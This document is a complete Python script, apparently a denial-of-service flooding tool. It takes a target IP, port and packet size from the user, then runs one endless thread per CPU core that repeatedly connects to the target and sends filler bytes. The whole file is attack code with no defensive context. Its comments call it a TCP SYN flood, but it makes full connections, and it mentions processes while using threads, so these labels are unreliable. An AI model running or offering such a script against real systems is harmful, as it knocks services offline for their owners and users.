import socket
import threading
import multiprocessing
import os

def send_tcp_syn_packets(target_ip, target_port, packet_size):
    while True:
        try:
            tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            tcp_socket.connect((target_ip, target_port))
            tcp_socket.send(b'A' * packet_size)
            tcp_socket.close()
        except socket.error as e:
            pass

# Prompt the user for target IP address, port, and packet size
target_ip = input("Enter the target IP address: ")
target_port = int(input("Enter the target port: "))
packet_size = int(input("Enter the packet size (in bytes): "))

# Calculate the number of processes based on the number of available CPU cores
num_processes = os.cpu_count()

# Create and start the TCP SYN packet sending threads
tcp_threads = []
for _ in range(num_processes):
    tcp_thread = threading.Thread(target=send_tcp_syn_packets, args=(target_ip, target_port, packet_size))
    tcp_thread.daemon = True
    tcp_thread.start()
    tcp_threads.append(tcp_thread)

# Keep the main thread alive to allow the TCP SYN threads to continue sending packets
while True:
    pass
